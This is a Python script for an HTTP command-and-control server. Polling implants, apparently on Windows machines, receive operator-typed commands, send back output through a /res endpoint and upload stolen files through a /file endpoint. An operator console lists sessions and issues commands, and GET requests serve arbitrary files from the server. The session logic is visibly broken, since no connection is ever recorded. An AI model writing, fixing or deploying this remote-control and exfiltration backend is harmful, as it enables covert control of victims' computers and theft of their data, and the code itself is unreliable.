from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
import json
import base64
import time
from urllib.parse import urlparse, parse_qs

connections = []
next_connection_id = 1
selected_session_index = None

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        self.current_location = "C:\\"
        self.command = ""
        super().__init__(*args, **kwargs)

    def do_GET(self):
        parsed_url = urlparse(self.path)
        query_params = parse_qs(parsed_url.query)

        if self.path.startswith('/command'):
            self.current_location = base64.b64decode(query_params['q'][0]).decode('utf-8')
            while True:
                if self.command == '':
                    time.sleep(3)
                else:
                    break
            with open('Log.log', 'a') as w:
                w.write(self.command)
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(bytes(self.command, 'utf-8'))
            self.command = ''
            return

        try:
            file_to_open = open(self.path[1:]).read()
            self.send_response(200)
        except FileNotFoundError:
            file_to_open = "File not found"
            self.send_response(404)

        self.end_headers()
        self.wfile.write(bytes(file_to_open, 'utf-8'))

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        path_part = self.path.split('/')
        self.path = path_part[1]

        if self.path == 'res':
            data = json.loads(post_data.decode())
            with open('Log.log', 'a') as w:
                w.write(data["data"])
            print(data["data"])

            response_message = f"Received POST request for /res endpoint with data"

        elif self.path == 'file':
            with open(path_part[2], 'wb') as w:
                w.write(post_data)

            response_message = f"Received POST request for /file endpoint with data"
        else:
            response_message = f"Received POST request with data"

        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(bytes(response_message, 'utf-8'))

def start_server():
    server_address = ('', 8000)
    httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
    print("Server running on port 8000")

    def serve_forever():
        nonlocal httpd
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("Shutting down server")
            httpd.server_close()

    threading.Thread(target=serve_forever, daemon=True).start()

    def manage_sessions():
        global selected_session_index
        while True:
            if len(connections) == 0:
                print("No connections established yet. Waiting for connection...")
                time.sleep(5)  # Wait for 5 seconds before checking again
                continue
            
            user_input = input("Enter 'sessions' to list sessions or 'set id [session_id]' to interact with a session: ")
            if user_input.strip().lower() == 'sessions':
                print("Active Sessions:")
                print("ID\tAddress")
                for conn_id, conn in enumerate(connections, 1):
                    print(f"{conn_id}\t{conn[1]}")

            elif user_input.strip().lower().startswith('set id'):
                try:
                    session_id = int(user_input.strip().split(' ')[-1])
                    selected_session_index = session_id - 1
                    print(f"Interacting with session {session_id} at {connections[selected_session_index][1]}")
                except (IndexError, ValueError):
                    print("Invalid session ID")

    def interact_with_session():
        global selected_session_index
        while True:
            if selected_session_index is not None:
                new_command = input(f"Enter new command for session {selected_session_index + 1}: ")
                connections[selected_session_index][0].command = new_command

    threading.Thread(target=manage_sessions, daemon=True).start()
    threading.Thread(target=interact_with_session, daemon=True).start()

    # Block the main thread to keep the program running
    while True:
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            print("Exiting program...")
            break

start_server()
